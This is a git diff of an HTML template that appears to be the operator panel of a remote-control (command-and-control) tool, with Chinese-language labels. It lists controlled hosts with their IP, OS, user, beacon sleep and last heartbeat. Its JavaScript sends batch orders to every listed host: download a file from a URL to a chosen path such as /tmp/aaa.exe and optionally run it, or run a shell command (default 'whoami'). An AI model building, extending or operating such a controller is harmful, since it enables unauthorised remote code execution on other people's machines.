@@ -43,128 +43,71 @@
             overflow: auto;
         }
     </style>
-    <script src="/static/js/myjs.js"></script>
-
-    <script>
+    <script type="text/javascript">
         function batch_download() {
-            $("#batch_download").css("display", "block");
-            $("#fade").css("display", "block");
-        }
+            
+            var http=prompt("下载地址","http://baidu.com");
+            var path=prompt("保存路径","/tmp/aaa.exe");
+            var isrun=prompt("是否运行(yes or no)","no");
+            let lists = document.getElementsByName("category");
 
-        function batch_download_close() {
-            $("#batch_download").css("display", "none");
-            $("#fade").css("display", "none");
-        }
+            let temp = [];
+            for (let i = 0; i < lists.length; i++) {
+                    temp.push(lists[i].value);
+                }
+            fetch('all?action=download', {
+                headers: {
+                  'content-type': 'application/json'
+                },
+                method: 'post',
+                body:JSON.stringify({"http":http,"path":path,"is_run":isrun,"target":temp})
 
+            })
+        };
         function batch_cmd() {
-            $("#batch_cmd").css("display", "block");
-            $("#fade").css("display", "block");
-        }
-
-        function batch_cmd_close() {
-            $("#batch_cmd").css("display", "none");
-            $("#fade").css("display", "none");
-        }
-
-        function batch_down_btu_on() {
-            let temp = [];
-            if ($("#batch_http_address").val() === "") {
-                $("#error_http_address2").html("网址不能为空");
-                return;
-            }
-            if ($("#batch_save_path").val() === "") {
-                $("#error_save_path2").html("目录不能为空");
-                return;
-            }
-            let url = $("#batch_http_address").val()
-            let path = $("#batch_save_path").val()
-            let is_run = $("#batch_is_run").val()
-            let b64 = btoa(JSON.stringify({
-                "url": url,
-                "path": path,
-                "is_run": is_run
-            }))
+            
+            var command=prompt("命令","whoami");
             let lists = document.getElementsByName("category");
-            console.log(lists)
-            if ($("#batch_download_os").val() === "windows") {
-                for (let i = 0; i < lists.length; i++) {
-                    if ($("#" + lists[i].value + " td")[3].innerText === "windows") {
-                        temp.push(lists[i].value)
-                    }
-                }
-            } else if ($("#batch_download_os").val() === "linux") {
-                for (let i = 0; i < lists.length; i++) {
-                    if ($("#" + lists[i].value + " td")[3].innerText === "linux") {
-                        temp.push(lists[i].value)
-                    }
-                }
-            } else if ($("#batch_download_os").val() === "select") {
-                for (let i = 0; i < lists.length; i++) {
-                    if (lists[i].checked) {
-                        temp.push(lists[i].value)
-                    }
-                }
-            }
-            for (let i = 0; i < temp.length; i++) {
-                console.log("batch download:", temp[i])
-                ws.send(JSON.stringify(
-                    {
-                        "uuid": temp[i],
-                        "do": {
-                            "do": "download",
-                            "data": b64
-                        }
-                    }
-                ))
-            }
 
-            $("#batch_download_result").html("发送成功");
+            let temp = [];
+            for (let i = 0; i < lists.length; i++) {
+                    temp.push(lists[i].value);
+                }
+            fetch('all?action=shell', {
+                headers: {
+                      'content-type': 'application/json'
+                    },
+                method: 'post',
+                body:JSON.stringify({
+                    "command":command,
+                    "target":temp
+                })
+            })
         }
 
-        function batch_execute_btu_on() {
-            let temp = [];
-            let d = $("#batch_cmd_input").val()
-            let p = $("#batch_cmd_param").val()
-            let b64 = btoa(JSON.stringify({
-                "command": d,
-                "param": p
-            }))
-            let lists = document.getElementsByName("category");
-            if ($("#batch_download_os").val() === "windows") {
-                for (let i = 0; i < lists.length; i++) {
 
-                    if ($("#" + lists[i].value + " td")[3].innerText === "windows") {
-                        temp.push(lists[i].value)
-                    }
-                }
-            } else if ($("#batch_download_os").val() === "linux") {
-                for (let i = 0; i < lists.length; i++) {
-                    if ($("#" + lists[i].value + " td")[3].innerText === "linux") {
-                        temp.push(lists[i].value)
-                    }
-                }
-            } else if ($("#batch_download_os").val() === "select") {
-                for (let i = 0; i < lists.length; i++) {
-                    if (lists[i].checked) {
-                        temp.push(lists[i].value)
-                    }
-                }
-            }
-            for (let i = 0; i < temp.length; i++) {
-                console.log("batch execute",temp[i])
-                ws.send(JSON.stringify(
-                    {
-                        "uuid": temp[i],
-                        "do": {
-                            "do": "cmd",
-                            "data": b64
-                        }
-                    }
-                ))
-                $("#batch_cmd_result").html("发送成功")
-            }
+        function batch_clear() {
+            var time=prompt("清理超时 ()s 的主机","600");
+            fetch('all?action=clear', {
+                 headers: {
+                  'content-type': 'application/json'
+                },
+                method: 'post',
+                body: JSON.stringify({
+                    "time":time
+                })
+            })
+            alert("清理成功");
+            
+        }
+        function generate() {
+            
+            alert("自己编译，俺懒得写了！");
+            
         }
     </script>
+
+   
 </head>
 <div>
     <div class="page-header">
@@ -176,31 +119,12 @@
 <!--        <button id="btn_refresh" type="button">Setting</button>-->
         <button id="btn_Down" type="button" onclick="batch_download();">Download</button>
         <button id="btn_execute" type="button" onclick="batch_cmd();">Execute</button>
-<!--        <button id="btn_del" type="button">Delete</button>-->
+        <button id="btn_del" type="button" onclick="batch_del();">Delete</button>
+        <button id="btn_clear" type="button" onclick="batch_clear();">Clear</button>
         <button id="btn_gen" type="button" onclick="generate();">Generate</button>
     </div>
     <br>
-    <!--    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">-->
-    <!--        <div class="modal-dialog">-->
-    <!--            <div class="modal-content">-->
-    <!--                <div class="modal-header">-->
-    <!--                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>-->
-    <!--                    <h4 class="modal-title" id="myModalLabel">远程终端</h4>-->
-    <!--                </div>-->
-    <!--                <div class="modal-body" style="text-align: center;">-->
-    <!--                    <div>-->
-    <!--                        <label>-->
-    <!--                            <textarea class="form-control" rows="3" style="width: 80%"></textarea>-->
-    <!--                        </label>-->
-    <!--                    </div>-->
-    <!--                </div>-->
-    <!--                <div class="modal-footer">-->
-    <!--                    <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>-->
-    <!--                    <button type="button" class="btn btn-primary">提交更改</button>-->
-    <!--                </div>-->
-    <!--            </div>-->
-    <!--        </div>-->
-    <!--    </div>-->
+
     <div>
         <table id="server_list" border="1" width="80%" style="margin-left: 10%;margin-right: 10%;text-align: center">
             <tr id="title">
@@ -209,22 +133,28 @@
                 <td>Remarks</td>
                 <td>OS</td>
                 <td>User</td>
-                <td>Status</td>
+                <td>Sleep</td>
+                <td>Last</td>
                 <td>Intranet IP</td>
                 <td>Action</td>
             </tr>
-<!--                        <tr id="s1">-->
-<!--                            <td><label>-->
-<!--                                    <input type="checkbox" name="category" value="s1"/>-->
-<!--                                </label></td>-->
-<!--                            <td>127.1.1.1</td>-->
-<!--                            <td>测试机器1</td>-->
-<!--                            <td>windows</td>-->
-<!--                            <td>WINPC-SDASD123/administrator</td>-->
-<!--                            <td>Loop</td>-->
-<!--                            <td>192.168.0.7</td>-->
-<!--                            <td><a href="#">终端</a> <a href="#">下载</a> <a href="#">备注</a></td>-->
-<!--                        </tr>-->
+
+            {% for i in conn %}
+            <tr id="{{ i.uuid }}">
+                <td><label>
+                        <input type="checkbox" name="category" value="{{ i.uuid }}"/>
+                    </label></td>
+                <td> {{ i.ip }}</td>
+                <td> {{ i.info.remarks }}</td>
+                <td> {{ i.info.system }}</td>
+                <td> {{ i.info.user }}</td>
+                <td> {{ i.sleep }}s</td>
+                <td>{{ i.hb }}s</td>
+                <td>{{i.info.iip}}</td>
+                <td><a href="client/{{i.uuid}}">操作</a>  <a href="#">删除</a></td>
+            </tr>
+            {% endfor %}
+            
 <!--                        <tr id="s2">-->
 <!--                            <td><label>-->
 <!--                                    <input type="checkbox" name="category" value="s2"/>-->
@@ -233,7 +163,8 @@
 <!--                            <td>测试机器1</td>-->
 <!--                            <td>linux</td>-->
 <!--                            <td>www-data</td>-->
-<!--                            <td>Loop</td>-->
+<!--                            <td>60</td>-->
+<!--                            <td>30s</td>-->
 <!--                            <td>192.168.0.7</td>-->
 <!--                            <td><a href="#">终端</a> <a href="#">下载</a> <a href="#">备注</a></td>-->
 <!--                        </tr>-->
@@ -243,63 +174,19 @@
          style="margin-left:10%;margin-right:11%;text-align:left;margin-top: 50px;max-height: 20%">
         <h2>日志</h2>
         <div id="log" style="border-style:solid; border-width:1px; border-color:#000;">
+            {% for i in event %}
+                <p style='color:green'> {{ i.data }}</p>
+            {% endfor %}
         </div>
     </div>
     <div id="title_bar" width="80%"
          style="margin-left:10%;margin-right:11%;text-align:center;margin-top: 50px;max-height: 20%">
-        <!-- <ul id="myTab" class="nav nav-tabs">
-        </ul> -->
 
     </div>
 
 
 </div>
-<div id="light" class="white_content">Cmd Shell
-
-    <a href="javascript:void(0)" onclick="cmd_close();" style="text-align: right;">关闭</a>
-    <br>
-    <p id="IP">目前控制的是：</p>
-    <div style="text-align: center;" id="cmdcommand" class="tab-pane fade in active">
-        <label>
-            <textarea id="cmd_textarea" rows="15" style="width: 95%" disabled="disabled"></textarea>
-        </label>
-        <label>
-            <input id="cmd_input" type="text" class="form-control" style="width: 95%">
-            <input id="cmd_param" type="text" class="form-control" style="width: 95%">
-            <button id="cmd_execute" aligh="right" onclick="cmd_execute()">execute</button>
-        </label>
-    </div>
-</div>
-<div id="remark" class="white_content">Remark
-
-    <a href="javascript:void(0)" onclick="remark_close();" style="text-align: right;">关闭</a>
-    <br>
-    备注：<input id="remark_input" type="text">
-
-    <button id="remark_btu" aligh="right" onclick="remark_btu_on()">修改</button>
-    <p id="remark_result"></p>
-</div>
-
-<div id="download" class="white_content">Web Download
-    <a href="javascript:void(0)" onclick="download_close();">关闭</a>
-    <br>
-    远程地址：<input id="http_address" type="text">
-    <p id="error_http_address" style="color:red"></p>
-    <br>
-    保存路径：<input id="save_path" type="text">
-    <p id="error_save_path" style="color:red"></p>
-    <br>
-    是否运行：<select id="is_run">
-        <option value="yes">是</option>
-        <option value="no">否</option>
-    </select>
-    <br>
-    <button id="download_btu" aligh="right" onclick="down_btu_on()">下载</button>
-    <p id="d_res"></p>
-
-</div>
-
-<div id="batch_download" class="white_content">Execute Batch
+<!-- <div id="batch_download" class="white_content">Execute Batch
     <a href="javascript:void(0)" onclick="batch_download_close();">关闭</a>
 
 
@@ -364,10 +251,8 @@
     <button id="generate_btu" aligh="right" onclick="generate_btu_on()">生成</button>
     <br>
 
-</div>
-<div id="fade" class="black_overlay"></div>
-<body>
+</div> -->
 
-</body>
+
 
 </html>
